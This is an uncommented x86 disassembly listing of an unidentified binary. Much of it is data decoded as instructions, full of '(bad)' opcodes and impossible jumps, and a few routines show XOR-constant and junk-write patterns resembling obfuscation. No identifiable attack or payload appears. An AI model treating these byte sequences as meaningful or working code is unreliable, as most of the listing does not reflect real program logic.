  40a32e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a330:	rol    DWORD PTR [ecx+esi*4+0x605ea2fc],0xf2
  40a338:	mov    DWORD PTR [edi],eax
  40a33a:	xor    al,0x49
  40a33c:	inc    edi
  40a33d:	xor    al,0x9f
  40a33f:	ja     0x40a2d2
  40a341:	pusha  
  40a342:	mov    al,BYTE PTR [edx+0x8]
  40a345:	xchg   ecx,eax
  40a346:	and    BYTE PTR [eax-0x7ffa5232],bl
  40a34c:	inc    esp
  40a34d:	or     al,0x2c
  40a34f:	bswap  eax
  40a351:	dec    edx
  40a352:	aam    0x7e
  40a354:	ret    
  40a355:	jbe    0x40a310
  40a357:	nop
  40a358:	popf   
  40a359:	lahf   
  40a35a:	adc    bh,BYTE PTR [ebx]
  40a35c:	scas   al,BYTE PTR es:[edi]
  40a35d:	daa    
  40a35e:	aas    
  40a35f:	dec    eax
  40a360:	lea    ecx,fs:[ecx]
  40a363:	sbb    BYTE PTR [ecx],0x10
  40a366:	sbb    edi,eax
  40a368:	pop    edi
  40a369:	sahf   
  40a36a:	fnsave [ebx-0x158f5722]
  40a370:	lds    ebx,FWORD PTR [edi]
  40a372:	cmp    al,BYTE PTR [ebx]
  40a374:	ds dec ebp
  40a376:	fnstsw WORD PTR [ebx+0x545a876d]
  40a37c:	jo     0x40a34f
  40a37e:	lds    ebp,FWORD PTR [eax]
  40a380:	orps   xmm1,XMMWORD PTR [edx-0x2c55055b]
  40a387:	mov    ah,0x21
  40a389:	loop   0x40a3af
  40a38b:	and    cl,dl
  40a38d:	and    al,0x13
  40a38f:	sub    BYTE PTR [eax],bl
  40a391:	test   DWORD PTR [ebx*2+0x4b94b4da],ebx
  40a398:	sub    al,0xf6
  40a39a:	mov    esi,0x2e881b5f
  40a39f:	lods   eax,DWORD PTR ds:[esi]
  40a3a0:	mov    ebx,0x3570204f
  40a3a5:	prefetch BYTE PTR [ebx-0x13]
  40a3a9:	in     al,dx
  40a3aa:	add    al,0x51
  40a3ac:	dec    ebp
  40a3ad:	cdq    
  40a3ae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a3af:	dec    edx
  40a3b0:	fisubr WORD PTR [edi]
  40a3b2:	cwde   
  40a3b3:	(bad)  
  40a3b4:	pop    ds
  40a3b5:	sub    DWORD PTR fs:[esi+ebx*1],edx
  40a3b9:	jnp    0x40a40c
  40a3bb:	arpl   WORD PTR [ecx+edi*8+0xe0fb758],di
  40a3c2:	add    al,0xa7
  40a3c4:	jno    0x40a425
  40a3c6:	scas   al,BYTE PTR es:[edi]
  40a3c7:	(bad)  
  40a3c8:	aaa    
  40a3c9:	repz xchg esi,eax
  40a3cb:	cmc    
  40a3cc:	fistp  QWORD PTR [eax+0x719f135f]
  40a3d2:	push   edx
  40a3d3:	inc    BYTE PTR [ecx]
  40a3d5:	imul   esi,DWORD PTR [edi+0x42],0xfffffff4
  40a3d9:	mov    esp,0x82c9d3c0
  40a3de:	(bad)  
  40a3df:	push   eax
  40a3e0:	xor    DWORD PTR [esi],esi
  40a3e2:	pushf  
  40a3e3:	outs   dx,BYTE PTR ds:[esi]
  40a3e4:	mov    esp,0xf0621cf1
  40a3e9:	repnz scas al,BYTE PTR es:[edi]
  40a3eb:	imul   esp,DWORD PTR [ebx],0xffffffe1
  40a3ee:	dec    ebx
  40a3ef:	(bad)  
  40a3f0:	mov    esi,0x78d33664
  40a3f5:	dec    ebx
  40a3f6:	loopne 0x40a388
  40a3f8:	jo     0x40a3d9
  40a3fa:	enter  0x702f,0xe0
  40a3fe:	pop    edi
  40a3ff:	jbe    0x40a3b9
  40a401:	sub    DWORD PTR [ecx+0x7b3d3c2a],esi
  40a407:	fs scas eax,DWORD PTR es:[edi]
  40a409:	mov    edx,fs
  40a40b:	aam    0xa
  40a40d:	pop    esp
  40a40e:	adc    ebx,esp
  40a410:	mov    edi,DWORD PTR [eax+0x68ba34ff]
  40a416:	lea    esi,ds:0xac4fcee4
  40a41c:	lods   al,BYTE PTR ss:[esi]
  40a41e:	xor    al,BYTE PTR [edi]
  40a420:	jmp    0x40a400
  40a422:	push   ds
  40a423:	push   ebx
  40a424:	adc    eax,0xbb5ebcd
  40a429:	push   ds
  40a42a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a42b:	xchg   ebp,eax
  40a42c:	shld   DWORD PTR [ebx-0x18],eax,cl
  40a430:	iret   
  40a431:	adc    al,0x3f
  40a433:	iret   
  40a434:	ins    BYTE PTR es:[edi],dx
  40a435:	pop    ecx
  40a436:	jmp    0xd2c1:0x906fbe71
  40a43d:	xchg   ecx,eax
  40a43e:	scas   al,BYTE PTR es:[edi]
  40a43f:	sub    DWORD PTR [ebx+0xd],edi
  40a442:	sub    ecx,esp
  40a444:	mov    ecx,0xe1b52e34
  40a449:	xor    eax,0x56dad064
  40a44e:	mov    bh,0x61
  40a450:	mov    edx,0xd8c99ebb
  40a455:	adc    ecx,esp
  40a457:	aam    0xca
  40a459:	shr    edx,0x36
  40a45c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a45d:	xchg   ecx,eax
  40a45e:	shr    BYTE PTR [ebx],1
  40a460:	out    0xcc,al
  40a462:	mov    edi,0x304e3723
  40a467:	push   0x904d433c
  40a46c:	in     al,0x2b
  40a46e:	shr    DWORD PTR [esi-0x17631498],0x11
  40a475:	cmc    
  40a476:	fstp   TBYTE PTR ss:[edi]
  40a479:	push   edi
  40a47a:	mov    edx,0x4768ebc4
  40a47f:	repnz nop
  40a481:	pop    ss
  40a482:	push   ecx
  40a483:	jl     0x40a42a
  40a485:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a486:	jnp    0x40a4c8
  40a488:	xchg   ebp,eax
  40a489:	push   ds
  40a48a:	xor    eax,0x3ae48cdb
  40a48f:	xchg   DWORD PTR [ebx],ebx
  40a491:	jge    0x40a417
  40a493:	shl    BYTE PTR [ebx-0x7e],cl
  40a496:	popf   
  40a497:	sub    DWORD PTR [edi+0x5a],edx
  40a49a:	lock xor ecx,DWORD PTR [eax-0x42622c99]
  40a4a1:	test   BYTE PTR [ebp-0x43],cl
  40a4a4:	xchg   ecx,eax
  40a4a5:	nop
  40a4a6:	inc    edi
  40a4a7:	sub    BYTE PTR [ebx+eax*4+0x1b],dl
  40a4ab:	mov    ecx,0x3d124876
  40a4b0:	push   ss
  40a4b1:	cs popf 
  40a4b3:	js     0x40a4a2
  40a4b5:	loopne 0x40a517
  40a4b7:	cmp    eax,DWORD PTR [eax-0x1a43877d]
  40a4bd:	or     edx,DWORD PTR fs:[ecx-0x74]
  40a4c1:	test   esi,esi
  40a4c3:	jo     0x40a532
  40a4c5:	ret    0x373b
  40a4c8:	dec    ebx
  40a4c9:	add    DWORD PTR [ecx],eax
  40a4cb:	cmp    dh,BYTE PTR [esi+0x413af072]
  40a4d1:	jns    0x40a485
  40a4d3:	xchg   ecx,eax
  40a4d4:	pushf  
  40a4d5:	mov    dh,0x5b
  40a4d7:	mov    ah,0xa0
  40a4d9:	aaa    
  40a4da:	(bad)  
  40a4db:	jmp    0x40a51a
  40a4dd:	fist   DWORD PTR [esi]
  40a4df:	pop    ecx
  40a4e0:	pop    esp
  40a4e1:	add    DWORD PTR [eax-0x1e],esi
  40a4e4:	push   eax
  40a4e5:	ret    0x838c
  40a4e8:	ss scas al,BYTE PTR es:[edi]
  40a4ea:	sbb    bh,ch
  40a4ec:	test   DWORD PTR [esi],esi
  40a4ee:	mov    ds:0x395437f1,eax
  40a4f3:	fistp  WORD PTR [eax+ebp*8]
  40a4f6:	mov    DWORD PTR es:[eax],0x8b068b00
  40a4fd:	dec    esi
  40a4fe:	add    al,0xf
  40a500:	lods   al,BYTE PTR ds:[esi]
  40a501:	enter  0xc102,0xe9
  40a505:	add    al,cl
  40a507:	jmp    0x6e2:0x7af1811e
  40a50e:	out    0x51,eax
  40a510:	xor    eax,edi
  40a512:	jmp    0x40a8f0
  40a517:	sbb    al,0x3d
  40a519:	jmp    0x40a4ee
  40a51b:	jmp    0x9189:0x511a1c23
  40a522:	jo     0x40a4b6
  40a524:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a525:	imul   edi,DWORD PTR [eax+ebx*8-0x61e7e7d5],0xd8181812
  40a530:	daa    
  40a531:	dec    ebp
  40a532:	fcomip st,st(6)
  40a534:	aam    0x96
  40a536:	(bad)  
  40a537:	pop    ecx
  40a538:	and    bh,ah
  40a53a:	pop    ds
  40a53b:	ds push 0x27
  40a53e:	mov    ebp,0xec98ddf6
  40a543:	in     eax,0x48
  40a545:	push   0x9836733d
  40a54a:	inc    ebp
  40a54b:	sub    eax,edi
  40a54d:	cdq    
  40a54e:	cmp    al,0x5f
  40a550:	mov    dh,0x4c
  40a552:	mov    dh,0x76
  40a554:	jmp    0x29437a94
  40a559:	ret    0x1bd1
  40a55c:	push   ds
  40a55d:	mov    ch,0x70
  40a55f:	sar    BYTE PTR [eax+0x6d],1
  40a562:	and    bh,bl
  40a564:	test   al,0x7b
  40a566:	cmp    eax,0x7c4451e2
  40a56b:	arpl   WORD PTR [eax],sp
  40a56d:	ja     0x40a5b4
  40a56f:	mov    bl,0x36
  40a571:	pop    esi
  40a572:	js     0x40a4f8
  40a574:	sbb    ecx,DWORD PTR [ebx+0x24306388]
  40a57a:	adc    BYTE PTR [ecx+0x0],bl
  40a57d:	xchg   edx,eax
  40a57e:	jmp    0xf33d27cb
  40a583:	adc    DWORD PTR [edi-0x46],esi
  40a586:	or     BYTE PTR [edi+0x6b6be3b3],ch
  40a58c:	pop    edx
  40a58d:	pop    edx
  40a58e:	inc    edi
  40a58f:	in     eax,dx
  40a590:	sbb    DWORD PTR [ecx-0x494a6aec],ebx
  40a596:	gs lahf 
  40a598:	or     cl,BYTE PTR [ebx]
  40a59a:	and    dh,ch
  40a59c:	inc    esp
  40a59d:	or     ax,0x25b3
  40a5a1:	(bad)  
  40a5a2:	sbb    BYTE PTR [edi-0x5fdbec97],dh
  40a5a8:	rol    DWORD PTR [edx+0x7f],1
  40a5ab:	sbb    BYTE PTR [edx+ecx*1],0x2c
  40a5af:	fwait
  40a5b0:	add    esp,DWORD PTR [ecx-0xd]
  40a5b3:	sbb    ah,BYTE PTR [eax+0x61]
  40a5b6:	pop    ds
  40a5b7:	mov    dh,0xce
  40a5b9:	idiv   DWORD PTR [ecx+ebp*8+0x4c8c5f44]
  40a5c0:	fiadd  WORD PTR [ebp-0x3e9489fb]
  40a5c6:	jmp    0x33a9022
  40a5cb:	mov    dh,0xae
  40a5cd:	mov    edx,0x70b700e2
  40a5d2:	push   ebp
  40a5d3:	sbb    al,0xe1
  40a5d5:	mov    WORD PTR [edx-0x1a],gs
  40a5d8:	gs sbb al,0xab
  40a5db:	scas   al,BYTE PTR es:[edi]
  40a5dc:	ins    DWORD PTR es:[edi],dx
  40a5dd:	aam    0xf2
  40a5df:	pop    eax
  40a5e0:	imul   eax,DWORD PTR [ebx],0x36
  40a5e3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a5e4:	mov    bh,BYTE PTR [ecx]
  40a5e6:	cmp    bh,BYTE PTR [esi-0x62]
  40a5e9:	mov    eax,ds:0xaed6e52b
  40a5ee:	ins    DWORD PTR es:[edi],dx
  40a5ef:	sub    eax,DWORD PTR [edi]
  40a5f1:	call   0x11fd:0x1f117880
  40a5f8:	and    al,0xca
  40a5fa:	gs in  al,0x46
  40a5fd:	test   eax,0x8ac8c290
  40a602:	fistp  WORD PTR [edx-0x44f0e3c]
  40a608:	fwait
  40a609:	scas   al,BYTE PTR es:[edi]
  40a60a:	(bad)  
  40a60b:	lock sbb DWORD PTR [ecx],edx
  40a60e:	inc    ebx
  40a60f:	sahf   
  40a610:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a611:	dec    esi
  40a612:	nop
  40a613:	mov    dh,0x6f
  40a615:	sbb    ebx,DWORD PTR [ebx-0x5f59850d]
  40a61b:	and    BYTE PTR [esi+0x11],bh
  40a61e:	mov    al,0xe3
  40a620:	es sub eax,0xa8f22c83
  40a626:	popf   
  40a627:	stc    
  40a628:	adc    bh,BYTE PTR [eax]
  40a62a:	fwait
  40a62b:	cwde   
  40a62c:	add    dl,BYTE PTR [eax]
  40a62e:	adc    DWORD PTR [esi-0x65],edi
  40a631:	dec    ecx
  40a632:	int3   
  40a633:	or     DWORD PTR [ecx+0x66],eax
  40a636:	mov    eax,0xcbcc4783
  40a63b:	xor    dl,BYTE PTR ds:0xe30bf2a7
  40a641:	mov    edi,0x2b3b6333
  40a646:	mov    eax,0x33e75002
  40a64b:	jno    0x40a69a
  40a64d:	loopne 0x40a5e4
  40a64f:	cmp    bh,0x8c
  40a652:	icebp  
  40a653:	push   ss
  40a654:	jnp    0x40a626
  40a656:	and    DWORD PTR [ecx-0x41],eax
  40a659:	pop    ss
  40a65a:	out    0x8f,eax
  40a65c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a65d:	jo     0x40a5f3
  40a65f:	fdivr  DWORD PTR [ecx+edx*4+0x6a461683]
  40a666:	lea    ebx,[edx-0x7eff2e52]
  40a66c:	ror    BYTE PTR [esi+0x20d2ead4],1
  40a672:	arpl   WORD PTR [edx+esi*8+0x51b6ac87],bx
  40a679:	mov    bh,0xce
  40a67b:	xchg   BYTE PTR [edi+0x10],cl
  40a67e:	call   0xbe86:0x1212c6fa
  40a685:	inc    edi
  40a686:	inc    ecx
  40a687:	and    al,dh
  40a689:	clc    
  40a68a:	test   eax,0x5513df91
  40a68f:	lock lea ebp,[ebp+0xc]
  40a693:	push   esi
  40a694:	loope  0x40a6b7
  40a696:	and    eax,DWORD PTR [ecx+ebx*4+0x6b]
  40a69a:	push   0x6d
  40a69c:	jbe    0x40a699
  40a69e:	fist   DWORD PTR [edi-0x74c3fa6d]
  40a6a4:	or     edx,DWORD PTR [ecx-0xe]
  40a6a7:	stos   BYTE PTR es:[edi],al
  40a6a8:	xchg   DWORD PTR [edx-0x53],ebx
  40a6ab:	fst    DWORD PTR [ebp+0x268e10ec]
  40a6b1:	mov    cl,0x88
  40a6b3:	mov    ds:0x3e992f38,al
  40a6b8:	mov    bl,0x85
  40a6ba:	fs fdiv st,st(2)
  40a6bd:	jbe    0x40a6e1
  40a6bf:	mov    DWORD PTR gs:[ebp+0x611f646b],ebp
  40a6c6:	mov    WORD PTR [ecx+0x742acf89],?
  40a6cc:	cmp    cl,BYTE PTR [esi-0x6e5a7a68]
  40a6d2:	lds    ebx,FWORD PTR [edx+ecx*1-0x2]
  40a6d6:	popa   
  40a6d7:	in     eax,0x6f
  40a6d9:	mov    ah,BYTE PTR [ecx]
  40a6db:	mov    eax,DWORD PTR [esi+0x68]
  40a6de:	jecxz  0x40a66d
  40a6e0:	les    ebx,FWORD PTR ds:0x9177fadb
  40a6e6:	jns    0x40a6c2
  40a6e8:	fnstenv [edx+eiz*8+0x7a4c598d]
  40a6ef:	dec    eax
  40a6f0:	inc    ecx
  40a6f1:	data16 lock sub bl,dh
  40a6f5:	shr    BYTE PTR [ebx+edx*1+0x3504031b],cl
  40a6fc:	rcr    DWORD PTR [ebx+0x522880b3],1
  40a702:	jmp    0x8de7:0xc33988cb
  40a709:	dec    ecx
  40a70a:	(bad)  
  40a70b:	ins    DWORD PTR es:[edi],dx
  40a70c:	jmp    0x40a6f0
  40a70e:	rcr    DWORD PTR [esi-0x3b],0x5
  40a712:	mov    ah,0xec
  40a714:	lods   eax,DWORD PTR ds:[esi]
  40a715:	sub    ebx,0x83bd2744
  40a71b:	div    ebp
  40a71d:	mov    bl,0xac
  40a71f:	ins    BYTE PTR es:[edi],dx
  40a720:	fmul   st(1),st
  40a722:	in     al,0xd1
  40a724:	push   ds
  40a725:	pop    ds
  40a726:	sar    BYTE PTR [edi],1
  40a728:	mov    ah,0x76
  40a72a:	and    ebx,esi
  40a72c:	repnz mov ch,0x2e
  40a72f:	mov    cl,0x19
  40a731:	loop   0x40a6dd
  40a733:	mov    ebx,DWORD PTR [esp+esi*2-0x63]
  40a737:	pop    ss
  40a738:	cmp    al,0xe7
  40a73a:	adc    bl,BYTE PTR [ebp-0x864e1db]
  40a740:	shl    BYTE PTR [eax+ebp*1+0x69],cl
  40a744:	rol    dl,1
  40a746:	jmp    FWORD PTR [esi]
  40a748:	mov    al,ds:0x45e636c0
  40a74d:	cmp    ecx,edx
  40a74f:	lock pop ds
  40a751:	imul   edi,DWORD PTR ds:0x55a70d57,0x638d5233
  40a75b:	adc    esi,edx
  40a75d:	fwait
  40a75e:	aad    0xe8
  40a760:	aas    
  40a761:	sbb    BYTE PTR [edi+ebp*4],dl
  40a764:	call   0x399e4b86
  40a769:	dec    edi
  40a76a:	outs   dx,DWORD PTR ds:[esi]
  40a76b:	xchg   ebp,eax
  40a76c:	and    DWORD PTR [ecx-0x3947fb9e],ebx
  40a772:	fadd   QWORD PTR [ecx+eax*4]
  40a775:	sbb    BYTE PTR [ebx+edx*4+0x4769e51d],bh
  40a77c:	lods   al,BYTE PTR ds:[esi]
  40a77d:	int    0xbc
  40a77f:	jns    0x40a737
  40a781:	xchg   BYTE PTR [ebp+0x602735bd],al
  40a787:	in     al,0xd5
  40a789:	out    0x42,eax
  40a78b:	mov    al,ds:0xc50a5731
  40a790:	dec    edx
  40a791:	cmp    al,BYTE PTR [ecx]
  40a793:	inc    esi
  40a794:	inc    ebx
  40a795:	sbb    ebp,DWORD PTR [ebp+ecx*1+0x57bb51ba]
  40a79c:	cmp    al,0xe1
  40a79e:	jge    0x40a751
  40a7a0:	es and al,0x6b
  40a7a3:	adc    DWORD PTR [esi+0x73],esi
  40a7a6:	adc    bh,BYTE PTR [edx-0x34e3261a]
  40a7ac:	pop    eax
  40a7ad:	sar    ebx,0x19
  40a7b0:	inc    esp
  40a7b1:	cmc    
  40a7b2:	inc    esi
  40a7b3:	in     eax,0x3f
  40a7b5:	mov    bl,0x2e
  40a7b7:	popf   
  40a7b8:	pop    esi
  40a7b9:	mov    dh,0xa5
  40a7bb:	fdiv   QWORD PTR [edi+0x51e3c7ac]
  40a7c1:	shl    BYTE PTR [ecx],1
  40a7c3:	inc    ecx
  40a7c4:	and    ah,BYTE PTR [esp+eax*1-0x2eaa8e90]
  40a7cb:	cmp    cl,BYTE PTR [edi-0x72]
  40a7ce:	and    bl,BYTE PTR [edx-0x32]
  40a7d1:	jle    0x40a79a
  40a7d3:	in     eax,0x5b
  40a7d5:	cwde   
  40a7d6:	mov    dl,0x1b
  40a7d8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a7d9:	mov    ch,dl
  40a7db:	sbb    BYTE PTR [edi-0x37],bh
  40a7de:	(bad)  [esi]
  40a7e0:	inc    esi
  40a7e1:	mov    ebp,0xc642ea6b
  40a7e6:	enter  0x4f32,0xbb
  40a7ea:	jno    0x40a7f1
  40a7ec:	pop    ebx
  40a7ed:	repz aaa 
  40a7ef:	test   DWORD PTR [ecx+0x9f45e9],eax
  40a7f5:	out    0x32,eax
  40a7f7:	push   ss
  40a7f8:	hlt    
  40a7f9:	mov    dh,0x23
  40a7fb:	in     al,0x36
  40a7fd:	ins    DWORD PTR es:[edi],dx
  40a7fe:	mov    eax,ds:0x64696fa8
  40a803:	stos   BYTE PTR es:[edi],al
  40a804:	retf   0xbcb
  40a807:	inc    esi
  40a808:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a809:	retf   0x234a
  40a80c:	gs push cs
  40a80e:	adc    bh,ah
  40a810:	jne    0x40a7ba
  40a812:	and    DWORD PTR ds:0x16715cc3,0x29
  40a819:	lods   al,BYTE PTR ds:[esi]
  40a81a:	sub    al,0x44
  40a81c:	cmp    ah,al
  40a81e:	xor    DWORD PTR [edi],edx
  40a820:	loope  0x40a7fc
  40a822:	cmp    BYTE PTR [edx+0x1b],bh
  40a825:	nop
  40a826:	scas   al,BYTE PTR es:[edi]
  40a827:	or     al,bl
  40a829:	leave  
  40a82a:	sbb    al,0xf
  40a82c:	sbb    DWORD PTR [esi-0x7bc2cd7d],0xf23912b0
  40a836:	mov    cs,WORD PTR [eax+edx*8+0x38]
  40a83a:	mov    eax,ds:0xe3ca1d33
  40a83f:	dec    eax
  40a840:	mov    bl,0xf0
  40a842:	fwait
  40a843:	xchg   DWORD PTR [eax+0x4d],esp
  40a846:	out    0x6c,eax
  40a848:	gs stos BYTE PTR es:[edi],al
  40a84a:	sub    cl,dh
  40a84c:	pop    esi
  40a84d:	sub    eax,0xcd9f17ac
  40a852:	adc    bl,BYTE PTR [esp+eiz*8-0x36]
  40a856:	scas   al,BYTE PTR es:[edi]
  40a857:	push   ebx
  40a858:	mov    ecx,0xa2ae8524
  40a85d:	rol    BYTE PTR [eax+0x54],0x77
  40a861:	(bad)  
  40a862:	sti    
  40a863:	mov    bh,0xf1
  40a865:	lods   eax,DWORD PTR ds:[esi]
  40a866:	loope  0x40a819
  40a868:	sbb    BYTE PTR [ecx+0x1f290860],dl
  40a86e:	data16 fmulp st(1),st
  40a871:	js     0x40a8d4
  40a873:	arpl   bx,si
  40a875:	loop   0x40a8f0
  40a877:	push   ebp
  40a878:	bound  edx,QWORD PTR [esp+eiz*8+0x12]
  40a87c:	scas   eax,DWORD PTR es:[edi]
  40a87d:	fld    DWORD PTR [edx-0x80]
  40a880:	cdq    
  40a881:	mov    ch,0x9d
  40a883:	jno    0x40a87b
  40a885:	call   0x8e:0xc2d78371
  40a88c:	mov    dl,0x32
  40a88e:	mov    fs,ebx
  40a890:	sub    ebp,DWORD PTR [ecx+0x3]
  40a893:	jnp    0x40a83e
  40a895:	aaa    
  40a896:	dec    eax
  40a897:	bound  edx,QWORD PTR [eax-0x417b3c43]
  40a89d:	enter  0x9cb7,0x39
  40a8a1:	ins    DWORD PTR es:[edi],dx
  40a8a2:	retf   0xbb92
  40a8a5:	je     0x40a87e
  40a8a7:	fdivrp st(5),st
  40a8a9:	xchg   edi,eax
  40a8aa:	jg     0x40a867
  40a8ac:	and    al,ah
  40a8ae:	ins    DWORD PTR es:[edi],dx
  40a8af:	dec    ebx
  40a8b0:	repz popf 
  40a8b2:	dec    edi
  40a8b3:	sbb    ebx,eax
  40a8b5:	xchg   ecx,eax
  40a8b6:	xor    al,0xc7
  40a8b8:	aam    0x1c
  40a8ba:	fucomi st,st(7)
  40a8bc:	pop    esp
  40a8bd:	inc    edx
  40a8be:	mov    WORD PTR [ebx],ss
  40a8c0:	add    DWORD PTR [edi+esi*4],0xde8fbfd4
  40a8c7:	add    al,0x4
  40a8c9:	cdq    
  40a8ca:	gs sub ecx,edx
  40a8cd:	(bad)  
  40a8ce:	js     0x40a861
  40a8d0:	xchg   ecx,eax
  40a8d1:	repnz push esi
  40a8d3:	mov    bl,BYTE PTR [ecx]
  40a8d5:	iret   
  40a8d6:	fs dec esi
  40a8d8:	mov    ds:0xb3fcd1f8,al
  40a8dd:	in     al,dx
  40a8de:	sub    eax,0x7816c535
  40a8e3:	enter  0x6da3,0x9b
  40a8e7:	js     0x40a95c
  40a8e9:	xor    DWORD PTR [edx+0x2a],0xd9b4e3fa
  40a8f0:	mov    DWORD PTR [ebp+0x10],edx
  40a8f3:	mov    edx,DWORD PTR [ebx]
  40a8f5:	mov    edi,DWORD PTR [ebx+0x4]
  40a8f8:	push   eax
  40a8f9:	push   edi
  40a8fa:	push   edx
  40a8fb:	call   0x416c20
  40a900:	shld   edx,eax,0x2
  40a904:	shl    eax,0x2
  40a907:	mov    ecx,eax
  40a909:	or     ecx,DWORD PTR [ebp+0x10]
  40a90c:	xor    eax,eax
  40a90e:	or     edx,eax
  40a910:	xor    ecx,0xca79a575
  40a916:	xor    edx,0x9c1b89e8
  40a91c:	mov    DWORD PTR [esi],ecx
  40a91e:	mov    DWORD PTR [esi+0x4],edx
  40a921:	mov    eax,0x40000000
  40a926:	mov    edx,DWORD PTR [ebx]
  40a928:	mov    ecx,DWORD PTR [ebx+0x4]
  40a92b:	xor    edx,0xca79a577
  40a931:	xor    ecx,0x9c1b89e8
  40a937:	shrd   edx,ecx,0x2
  40a93b:	shr    ecx,0x2
  40a93e:	mov    DWORD PTR [ebp-0x6c],ecx
  40a941:	mov    ecx,DWORD PTR [ebx]
  40a943:	mov    edi,DWORD PTR [ebx+0x4]
  40a946:	mov    edi,ecx
  40a948:	xor    ecx,ecx
  40a94a:	or     ecx,edx
  40a94c:	mov    DWORD PTR [ebp+0x8],ecx
  40a94f:	mov    ecx,DWORD PTR [esi]
  40a951:	mov    edx,DWORD PTR [esi+0x4]
  40a954:	xor    edx,0x9c1b89e8
  40a95a:	xor    ecx,0xca79a577
  40a960:	shl    edi,0x1e
  40a963:	mov    DWORD PTR [ebp+0x14],ecx
  40a966:	mov    ecx,edx
  40a968:	mov    edx,DWORD PTR [ebp+0x14]
  40a96b:	shrd   edx,ecx,0x2
  40a96f:	xor    edi,eax
  40a971:	or     edi,DWORD PTR [ebp-0x6c]
  40a974:	mov    DWORD PTR [ebp-0x70],edx
  40a977:	mov    edx,DWORD PTR [esi]
  40a979:	mov    DWORD PTR [ebp+0xc],edi
  40a97c:	mov    edi,DWORD PTR [esi+0x4]
  40a97f:	shl    edx,0x1e
  40a982:	xor    edi,edi
  40a984:	or     edi,DWORD PTR [ebp-0x70]
  40a987:	shr    ecx,0x2
  40a98a:	xor    edx,eax
  40a98c:	or     edx,ecx
  40a98e:	cmp    edi,DWORD PTR [ebp+0x8]
  40a991:	jne    0x40a9a0
  40a997:	cmp    edx,DWORD PTR [ebp+0xc]
  40a99a:	je     0x40a9b0
  40a9a0:	push   DWORD PTR [ebp+0x20]
  40a9a3:	push   DWORD PTR [ebp+0x1c]
  40a9a6:	push   DWORD PTR [ebp+0x18]
  40a9a9:	push   ebx
  40a9aa:	push   esi
  40a9ab:	call   0x414dd5
  40a9b0:	pop    edi
  40a9b1:	leave  
  40a9b2:	ret    0x1c
  40a9b5:	cmp    cl,0x40
  40a9b8:	mov    DWORD PTR ds:0x4282c3,0x3afd
  40a9c2:	jae    0x40aa0b
  40a9c8:	mov    DWORD PTR ds:0x4282b7,0x7b96
  40a9d2:	cmp    cl,0x20
  40a9d5:	mov    DWORD PTR ds:0x428213,0x3ad8
  40a9df:	jae    0x40a9fb
  40a9e5:	mov    DWORD PTR ds:0x4282bb,0x760a
  40a9ef:	shrd   eax,edx,cl
  40a9f2:	not    DWORD PTR ds:0x428243
  40a9f8:	shr    edx,cl
  40a9fa:	ret    
  40a9fb:	add    DWORD PTR ds:0x428237,ecx
  40aa01:	mov    eax,edx
  40aa03:	xor    edx,edx
  40aa05:	and    cl,0x1f
  40aa08:	shr    eax,cl
  40aa0a:	ret    
  40aa0b:	xor    eax,eax
  40aa0d:	xor    edx,edx
  40aa0f:	ret    
  40aa10:	push   ebp
  40aa11:	mov    ebp,esp
  40aa13:	sub    esp,0x30
  40aa16:	mov    DWORD PTR [ebp-0x18],0xca79a575
  40aa1d:	xor    ecx,ecx
  40aa1f:	mov    eax,0x9c1b89e8
  40aa24:	mov    DWORD PTR [ebp-0x14],eax
  40aa27:	not    ecx
  40aa29:	mov    DWORD PTR [ebp-0x30],0xca79a571
  40aa30:	dec    DWORD PTR ds:0x4282b3
  40aa36:	mov    DWORD PTR [ebp-0x2c],eax
  40aa39:	mov    DWORD PTR [ebp-0x28],0xae8f94a8
  40aa40:	mov    ecx,DWORD PTR ds:0x4281eb
  40aa46:	sbb    DWORD PTR ds:0x42812b,ecx
  40aa4c:	mov    DWORD PTR [ebp-0x24],0x29bd2
  40aa53:	jmp    0x40ae49
  40aa58:	clc    
  40aa59:	sub    dh,BYTE PTR [edx+0x306b2a6b]
  40aa5f:	sub    bh,BYTE PTR ds:0x537e1f6a
  40aa65:	js     0x40aa6d
  40aa67:	push   0x5f
  40aa69:	and    ebx,DWORD PTR [eax]
  40aa6b:	sbb    BYTE PTR [esi+0x12],ch
  40aa6e:	sbb    BYTE PTR [eax],bl
  40aa70:	xlat   BYTE PTR ds:[ebx]
  40aa71:	pop    edx
  40aa72:	xlat   BYTE PTR ds:[ebx]
  40aa73:	sub    al,ch
  40aa75:	sub    dl,BYTE PTR [eax]
  40aa77:	xchg   WORD PTR [edx-0x12],bp
  40aa7b:	adc    al,0x6e
  40aa7d:	repz dec ebx
  40aa7f:	fist   DWORD PTR [edx+esi*1]
  40aa82:	add    BYTE PTR [eax+0x73],0xfe
  40aa86:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40aa87:	and    eax,DWORD PTR [ebx+0x71]
  40aa8a:	enter  0x1d9a,0xce
  40aa8e:	(bad)  
  40aa8f:	mov    ah,0x95
  40aa91:	inc    edi
  40aa92:	pop    ebp
  40aa93:	mov    edx,0xe61d2b54
  40aa98:	jle    0x40aa83
  40aa9a:	inc    ecx
  40aa9b:	jo     0x40aa61
  40aa9d:	jmp    0xcf4:0x8e271c2e
  40aaa4:	push   eax
  40aaa5:	sti    
  40aaa6:	into   
  40aaa7:	xchg   edx,eax
  40aaa8:	(bad)  
  40aaa9:	mov    al,ds:0x8443d041
  40aaae:	outs   dx,BYTE PTR ds:[esi]
  40aaaf:	loop   0x40aa43
  40aab1:	test   BYTE PTR [ebp-0x76],dl
  40aab4:	imul   ebx,DWORD PTR [ecx+0x24],0x89498091
  40aabb:	sub    dl,BYTE PTR [edi-0x7e]
  40aabe:	xchg   ebp,eax
  40aabf:	in     eax,dx
  40aac0:	pusha  
  40aac1:	sbb    DWORD PTR [ebx],ecx
  40aac3:	mov    eax,ds:0xdb5c4e20
  40aac8:	xor    eax,0xaca04fe2
  40aacd:	mov    bh,0x57
  40aacf:	ret    0x259a
  40aad2:	mov    ds:0xdab968ae,eax
